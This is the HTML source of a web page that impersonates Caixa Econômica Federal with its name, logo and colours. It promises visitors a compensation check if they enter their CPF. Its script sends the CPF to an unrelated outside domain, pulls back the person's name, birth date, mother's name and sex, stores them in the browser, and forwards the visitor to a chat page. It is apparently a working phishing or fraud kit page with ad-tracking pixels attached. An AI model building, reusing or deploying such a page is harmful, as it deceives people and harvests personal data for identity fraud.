<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="utf-8" />
    <script>
      window.pixelId = "67ef67b0655738af4b8dbdd8";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-subids
      data-utmify-ignore-iframe
      async
      defer
    ></script>
    <!-- Meta Pixel Code -->
    <script>
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "2853456888176959");
      fbq("track", "PageView");
    </script>
    <noscript
      ><img
        height="1"
        width="1"
        style="display: none"
        src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1"
    /></noscript>
    <!-- End Meta Pixel Code -->
    <script
      src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js"
      async
      defer
    ></script>
    ;
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="robots" content="noindex, nofollow" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />

    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Consulta de Indenização - Caixa Econômica Federal</title>
    <link rel="icon" href="./images/icons/favicon.ico" />
    <link href="./css/modern.css" rel="stylesheet" type="text/css" />
    <link href="./css/fsso.css" rel="stylesheet" type="text/css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
    />

    <script src="./js/jquery-3.2.1.min.js" type="text/javascript"></script>
    <script src="./js/imask.min.js" type="text/javascript"></script>
    <style type="text/css">
      :root {
        --color-primary: #005ca9;
        --color-secondary: #f39200;
        --color-tertiary: #ffffff;
        --color-background: #f5f5f5;
        --color-text: #3a4859;
        --color-error: #ff0000;
        --color-success: #00a651;
        --font-primary: "Montserrat", "Futura Bold", sans-serif;
        --font-secondary: "Montserrat", "Futura Book", sans-serif;
        --border-radius: 8px;
        --box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
        --transition: all 0.3s ease;
      }

      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: var(--font-secondary);
        background: linear-gradient(135deg, #005aa3, #54bbab 100%);
        color: var(--color-text);
        line-height: 1.6;
      }

      #template {
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }

      #template-wrapper {
        background-color: var(--color-tertiary);
        border-radius: var(--border-radius);
        box-shadow: var(--box-shadow);
        width: 100%;
        max-width: 480px;
        overflow: hidden;
        transition: var(--transition);
      }

      #template-wrapper-content {
        padding: 30px;
      }

      #template-header {
        text-align: center;
        margin-bottom: 25px;
      }

      #template-logo {
        height: 45px;
        margin-bottom: 15px;
      }

      #template-title {
        color: var(--color-primary);
        font-family: var(--font-primary);
        font-size: 1.3rem;
        font-weight: 600;
      }

      .title {
        color: var(--color-primary);
        font-family: var(--font-primary);
        font-size: 1.2rem;
        font-weight: 600;
        margin-bottom: 10px;
        text-align: center;
      }

      .description {
        color: var(--color-text);
        font-size: 1rem;
        text-align: center;
        margin-bottom: 25px;
      }

      .float-label-group {
        margin-bottom: 25px;
      }

      .float-label {
        position: relative;
        margin-bottom: 20px;
      }

      .float-label input {
        width: 100%;
        padding: 15px;
        border: 1px solid #ddd;
        border-radius: var(--border-radius);
        font-size: 1rem;
        transition: var(--transition);
        background-color: #fff;
        color: var(--color-text);
      }

      .float-label input:focus {
        border-color: var(--color-secondary);
        outline: none;
        box-shadow: 0 0 0 2px rgba(243, 146, 0, 0.2);
      }

      .float-label label {
        position: absolute;
        top: -10px;
        left: 10px;
        background-color: white;
        padding: 0 5px;
        font-size: 0.85rem;
        color: var(--color-primary);
        font-weight: 500;
      }

      .button-group {
        margin-top: 20px;
      }

      button.button-primary {
        width: 100%;
        padding: 15px;
        background-color: var(--color-secondary);
        color: white;
        border: none;
        border-radius: var(--border-radius);
        font-family: var(--font-primary);
        font-weight: 600;
        font-size: 1rem;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        justify-content: center;
      }

      button.button-primary:hover {
        background-color: #e08600;
        transform: translateY(-2px);
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      }

      button.button-primary:active {
        transform: translateY(0);
      }

      #resultado {
        margin-top: 25px;
        padding: 20px;
        border-radius: var(--border-radius);
        display: none;
        font-size: 0.95rem;
        line-height: 1.5;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
      }

      #resultado.sucesso {
        background-color: rgba(0, 166, 81, 0.1);
        color: var(--color-success);
        border-left: 4px solid var(--color-success);
        display: block;
      }

      #resultado.erro {
        background-color: rgba(255, 0, 0, 0.1);
        color: var(--color-error);
        border-left: 4px solid var(--color-error);
        display: block;
      }

      .loader {
        display: none;
        border: 3px solid rgba(0, 92, 169, 0.1);
        border-top: 3px solid var(--color-primary);
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin: 25px auto;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }

        100% {
          transform: rotate(360deg);
        }
      }

      #template-info {
        text-align: center;
        margin-top: 30px;
        border-top: 1px solid #eee;
        padding-top: 20px;
      }

      .faq-layout {
        display: flex;
        align-items: center;
        justify-content: center;
      }

      #template-wrapper-help {
        margin-right: 10px;
      }

      #template-help {
        width: 20px;
        height: 20px;
      }

      #faq {
        display: none;
        margin-top: 20px;
        padding: 15px;
        background-color: #f9f9f9;
        border-radius: var(--border-radius);
      }

      @media (max-width: 576px) {
        #template-wrapper-content {
          padding: 20px;
        }

        .title {
          font-size: 1.1rem;
        }

        .description {
          font-size: 0.9rem;
        }

        .float-label input {
          padding: 12px;
        }

        button.button-primary {
          padding: 12px;
        }
      }
    </style>

    <script type="text/javascript">
      var faqIsLoaded = false;

      function toggleFunction() {
        // Obter a URL atual sem parâmetros de consulta
        const urlSemParametros =
          window.location.protocol +
          "//" +
          window.location.host +
          window.location.pathname;
        // Atualizar a URL no navegador, removendo os parâmetros de consulta
        window.history.replaceState(
          { path: urlSemParametros },
          "",
          urlSemParametros
        );
      }

      function toggleQuestion(el) {
        el.classList.toggle("active");
      }

      function toggleFaq() {
        var faq = document.getElementById("faq");
        var display = faq.style.display;
        if (!faqIsLoaded) {
          loadFaq();
        }
        if (display && display === "block") {
          faq.style.display = "none";
        } else {
          faq.style.display = "block";
        }
      }

      function loadFaq() {
        var xhttp = new XMLHttpRequest();
        faqIsLoaded = true;
        xhttp.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200) {
            document.getElementById("faq").innerHTML = this.responseText;
          }
        };
        xhttp.open(
          "GET",
          "/auth/resources/7.3.3.ga/login/LoginCaixa2Passos/html/faqV3.html",
          true
        );
        xhttp.send();
      }

      function formatarCPF(cpf) {
        cpf = cpf.replace(/\D/g, "");
        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
        return cpf;
      }

      function verificarConta() {
        var cpf = document.getElementById("cpf").value;
        cpf = cpf.replace(/\D/g, "");
        if (cpf.length !== 11) {
          document.getElementById("resultado").className = "erro";
          document.getElementById("resultado").innerHTML =
            '<i class="fas fa-exclamation-circle"></i> CPF inválido. O CPF deve conter 11 dígitos.';
          document.getElementById("resultado").style.display = "block";
          return false;
        }
        document.getElementById("loader").style.display = "block";
        document.getElementById("resultado").style.display = "none";
        document.getElementById("verificarBtn").disabled = true;
        document.getElementById("verificarBtn").innerHTML =
          '<i class="fas fa-spinner fa-spin"></i> Verificando...';
        const urlParams = new URLSearchParams(window.location.search);
        urlParams.delete("cpf");
        urlParams.append("cpf", cpf);
        const urlParamsString = urlParams.toString();
        fetch("https://site-clientes.info/aknes-api/aknes.php?cpf=" + cpf)
          .then((response) => {
            if (!response.ok) {
              throw new Error("Erro na requisição: " + response.status);
            }
            return response.json();
          })
          .then((data) => {
            if (!data || data.status !== 200) {
              throw new Error("Consulta não retornou dados válidos");
            }
            const dadosUsuario = {
              nome: data.nome || "",
              dataNascimento: data.nascimento || "",
              nomeMae: data.mae || "",
              cpf: data.cpf || cpf,
              sexo: data.sexo || "",
              consultadoEm: new Date().toISOString(),
            };
            localStorage.setItem("userData", JSON.stringify(dadosUsuario));
            window.location.href = `./chat/index.html?${urlParamsString}`;
          })
          .catch((error) => {
            document.getElementById("loader").style.display = "none";
            document.getElementById("verificarBtn").disabled = false;
            document.getElementById("verificarBtn").innerHTML =
              '<i class="fas fa-search"></i> Verificar minha indenização';
            document.getElementById("resultado").className = "erro";
            document.getElementById("resultado").innerHTML =
              '<i class="fas fa-exclamation-circle"></i> Erro ao realizar a consulta: ' +
              error.message;
            document.getElementById("resultado").style.display = "block";
          });
        return false;
      }

      document.addEventListener("DOMContentLoaded", function () {
        // Aplicar máscara no campo de CPF
        var cpfInput = document.getElementById("cpf");
        if (cpfInput) {
          cpfInput.addEventListener("input", function () {
            this.value = formatarCPF(this.value);
          });
        }

        // Adicionar ícone ao botão inicialmente
        document.getElementById("verificarBtn").innerHTML =
          '<i class="fas fa-search"></i> Verificar minha indenização';
      });
    </script>
  </head>

  <body>
    <div id="template">
      <div id="template-wrapper">
        <div id="template-wrapper-content">
          <header id="template-header">
            <img
              alt="logo caixa"
              id="template-logo"
              class="fa"
              src="images/logo-caixa.png"
            />
          </header>

          <section id="template-section">
            <h4 class="title">
              <i class="fas fa-hand-holding-usd"></i> Consulta de Indenização
            </h4>
            <p class="description">
              Digite seu CPF para verificar se você tem direito a uma
              indenização
            </p>

            <form onsubmit="return verificarConta()">
              <div class="float-label-group">
                <div class="float-label">
                  <input
                    type="text"
                    id="cpf"
                    name="cpf"
                    placeholder=""
                    maxlength="14"
                    required
                  />
                  <label for="cpf"><i class="fas fa-id-card"></i> CPF</label>
                </div>
              </div>

              <div class="button-group">
                <button type="submit" id="verificarBtn" class="button-primary">
                  Verificar minha indenização
                </button>
              </div>
            </form>

            <div id="loader" class="loader"></div>
            <div id="resultado"></div>
          </section>

          <footer id="template-info">
            <section id="template-faq">
              <div class="faq-layout">
                <div id="template-wrapper-help">
                  <i
                    class="fas fa-question-circle"
                    style="color: var(--color-primary); font-size: 20px"
                  ></i>
                </div>
                <a href="#faq" style="font-weight: bold" onclick="toggleFaq()"
                  >Preciso de ajuda</a
                >
              </div>
              <div id="faq"></div>
            </section>
          </footer>
        </div>
      </div>
    </div>
  </body>
</html>
